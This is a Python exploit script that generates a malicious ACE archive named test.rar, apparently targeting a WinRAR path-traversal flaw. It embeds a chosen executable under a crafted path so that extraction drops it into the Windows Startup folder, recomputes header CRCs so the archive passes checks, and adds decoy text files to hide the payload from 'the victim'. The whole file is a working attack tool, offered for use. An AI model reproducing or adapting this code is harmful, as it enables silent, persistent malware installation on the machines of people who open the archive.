#!/usr/bin/env python3

import os
import re
import zlib
import binascii

# The archive filename you want
rar_filename = "test.rar"
# The evil file you want to run
evil_filename = "calc.exe"
# The decompression path you want, such shown below
target_filename = r"C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe"
# Other files to be displayed when the victim opens the winrar
# filename_list=[]
filename_list = ["hello.txt", "world.txt"]

class AceCRC32:
    def __init__(self, buf=b''):
        self.__state = 0
        if len(buf) > 0:
            self += buf

    def __iadd__(self, buf):
        self.__state = zlib.crc32(buf, self.__state)
        return self

    def __eq__(self, other):
        return self.sum == other

    def __format__(self, format_spec):
        return self.sum.__format__(format_spec)

    def __str__(self):
        return "0x%08x" % self.sum

    @property
    def sum(self):
        return self.__state ^ 0xFFFFFFFF

def ace_crc32(buf):
    return AceCRC32(buf).sum

def get_ace_crc32(filename):
    with open(filename, 'rb') as f:
        return ace_crc32(f.read())

def get_right_hdr_crc(filename):
    # This command may be different, it depends on the your Python3 environment.
    p = os.popen('py -3 acefile.py --headers %s'%(filename))
    res = p.read()
    pattern = re.compile('right_hdr_crc : 0x(.*?) | struct')
    result = pattern.findall(res)
    right_hdr_crc = result[0].upper()
    return hex2raw4(right_hdr_crc)

def modify_hdr_crc(shellcode, filename):
    hdr_crc_raw = get_right_hdr_crc(filename)
    shellcode_new = shellcode.replace("6666", hdr_crc_raw)
    return shellcode_new

def hex2raw4(hex_value):
    while len(hex_value) < 4:
        hex_value = '0' + hex_value
    return hex_value[2:] + hex_value[:2]

def hex2raw8(hex_value):
    while len(hex_value) < 8:
        hex_value = '0' + hex_value
    return hex_value[6:] + hex_value[4:6] + hex_value[2:4] + hex_value[:2]

def get_file_content(filename):
    with open(filename, 'rb') as f:
        return str(binascii.hexlify(f.read()))[2:-1] # [2:-1] to remote b'...'

def make_shellcode(filename, target_filename):
    if target_filename == "":
        target_filename = filename
    hdr_crc_raw = "6666"
    hdr_size_raw = hex2raw4(str(hex(len(target_filename)+31))[2:])
    packsize_raw = hex2raw8(str(hex(os.path.getsize(filename)))[2:])
    origsize_raw = packsize_raw
    crc32_raw = hex2raw8(str(hex(get_ace_crc32(filename)))[2:])
    filename_len_raw = hex2raw4(str(hex(len(target_filename)))[2:])
    filename_raw = "".join("{:x}".format(ord(c)) for c in target_filename)
    content_raw = get_file_content(filename)
    shellcode = hdr_crc_raw + hdr_size_raw + "010180" + packsize_raw \
              + origsize_raw + "63B0554E20000000" + crc32_raw + "00030A005445"\
              + filename_len_raw + filename_raw + "8888888888888888888888888888"
    return shellcode

def build_file(shellcode, filename):
    with open(filename, "wb") as f:
        f.write(binascii.a2b_hex(shellcode.upper()))

def build_file_add(shellcode, filename):
    with open(filename, "ab+") as f:
        f.write(binascii.a2b_hex(shellcode.upper()))

def build_file_once(filename, target_filename=""):
    shellcode = make_shellcode(filename, target_filename)
    build_file_add(shellcode, rar_filename)
    shellcode_new = modify_hdr_crc(shellcode, rar_filename)
    content_raw = get_file_content(rar_filename).upper()
    build_file(content_raw.replace(shellcode.upper(), shellcode_new.upper()).replace("8888888888888888888888888888", get_file_content(filename)), rar_filename)

if __name__ == '__main__':
    print("[*] Start to generate the archive file %s..."%(rar_filename))

    shellcode_head = "6B2831000000902A2A4143452A2A141402001018564E974FF6AA00000000162A554E524547495354455245442056455253494F4E2A"
    build_file(shellcode_head, rar_filename)

    for i in range(len(filename_list)):
        build_file_once(filename_list[i])

    build_file_once(evil_filename, target_filename)

    print("[+] Evil archive file %s generated successfully !"%(rar_filename))